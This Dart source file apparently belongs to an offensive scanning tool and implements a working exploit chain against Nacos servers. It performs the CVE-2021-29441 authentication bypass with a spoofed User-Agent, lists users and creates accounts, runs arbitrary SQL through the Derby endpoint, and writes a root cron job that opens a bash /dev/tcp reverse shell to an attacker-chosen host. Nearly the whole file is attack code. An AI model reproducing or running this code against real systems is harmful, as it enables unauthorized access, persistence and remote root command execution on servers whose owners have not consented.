import 'dart:convert';

import 'exp_result.dart';
import '../../../core/http/http_client.dart';

class NacosExpService {
  final String baseUrl;
  final Duration timeout;

  NacosExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<ExpResult> check() async {
    try {
      final res = await _httpClient.get(
        '$_base/nacos/v1/auth/users?pageNo=1&pageSize=9',
        headers: {'User-Agent': 'Nacos-Server'},
      );
      if (res.statusCode == 200 &&
          ((res.body ?? '').contains('username') ||
              (res.body ?? '').contains('pageItems'))) {
        return ExpResult(
          true,
          'CVE-2021-29441',
          '认证绕过成功，获取用户列表:\n${res.body ?? ''}',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2021-29441', '');
  }

  Future<String?> listUsers() async {
    try {
      final res = await _httpClient.get(
        '$_base/nacos/v1/auth/users?pageNo=1&pageSize=100',
        headers: {'User-Agent': 'Nacos-Server'},
      );
      return res.body;
    } catch (_) {
      return null;
    }
  }

  Future<String?> createUser(String username, String password) async {
    try {
      final res = await _httpClient.post(
        '$_base/nacos/v1/auth/users',
        headers: {
          'User-Agent': 'Nacos-Server',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'username=$username&password=$password',
      );
      return res.body;
    } catch (_) {
      return null;
    }
  }

  /// 登录获取 accessToken，用于后续需要鉴权的接口
  Future<String?> login(String username, String password) async {
    try {
      final res = await _httpClient.post(
        '$_base/nacos/v1/auth/users/login',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username=$username&password=$password',
      );
      if (res.statusCode == 200) {
        final decoded = jsonDecode(res.body ?? '');
        return decoded['accessToken'] as String?;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  /// 通过 Derby SQL 接口执行任意 SQL（需要 accessToken）
  /// 返回 null 表示网络异常，返回字符串以 [DERBY_UNAVAILABLE] 开头表示非 Derby 模式
  Future<String?> derbyQuery(String token, String sql) async {
    try {
      final uri = Uri.parse('$_base/nacos/v1/cs/ops/derby').replace(
        queryParameters: {'sql': sql, 'accessToken': token},
      );
      final res = await _httpClient.get(uri.toString());
      final body = res.body ?? '';
      if (body.contains('not Derby') || body.contains('storage mode is not Derby')) {
        return '[DERBY_UNAVAILABLE] 目标使用外部数据库（MySQL 等），Derby RCE 不适用';
      }
      return res.body;
    } catch (_) {
      return null;
    }
  }

  /// 通过 Derby SYSCS_EXPORT_QUERY 写入 cron 反弹 shell
  /// 写入路径 /etc/cron.d/nacos_shell，每分钟以 root 执行反弹
  Future<String?> writeCronShell(String token, String ip, String port) async {
    final cronLine =
        '* * * * * root bash -i >& /dev/tcp/$ip/$port 0>&1';
    final sql =
        "CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY("
        "'SELECT ''$cronLine'' FROM sys.systables FETCH FIRST 1 ROW ONLY',"
        "'/etc/cron.d/nacos_shell',',',NULL,'UTF-8')";
    return derbyQuery(token, sql);
  }
}
